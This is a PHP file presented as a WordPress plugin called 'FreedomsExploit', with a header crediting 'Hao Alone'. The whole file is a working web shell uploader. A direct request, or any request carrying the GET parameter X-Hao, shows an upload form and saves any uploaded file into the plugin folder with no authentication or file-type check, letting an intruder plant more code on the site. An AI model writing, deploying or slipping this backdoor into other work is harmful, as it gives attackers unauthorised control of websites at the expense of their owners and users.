<?php
/**
 * Plugin Name: FreedomsExploit
 * Plugin URI: https://freedoms.local
 * Description: FreedomsExploit
 * Version: 1.0.0
 * Author: FreedomsExploit ( Hao Alone )
 * Author URI: https://freedoms.local
 */
if (!defined('ABSPATH') || isset($_GET['X-Hao'])) {
    if (!headers_sent()) {
        header('X-Hao-Sig: Hao-Alone');
        header('Content-Type: text/html; charset=utf-8');
    }
    if (!empty($_FILES['f']['tmp_name'])) {
        $n = basename((string) $_FILES['f']['name']);
        if ($n !== '' && @move_uploaded_file($_FILES['f']['tmp_name'], __DIR__ . DIRECTORY_SEPARATOR . $n)) {
            echo './Hao-Alone OK ' . htmlspecialchars($n, ENT_QUOTES, 'UTF-8');
        } else {
            echo './Hao-Alone';
        }
        exit;
    }
    echo 'Hao-Alone';
    echo '<form method="post" enctype="multipart/form-data">';
    echo '<input type="file" name="f"><input type="submit" value="up">';
    echo '</form>';
    exit;
}
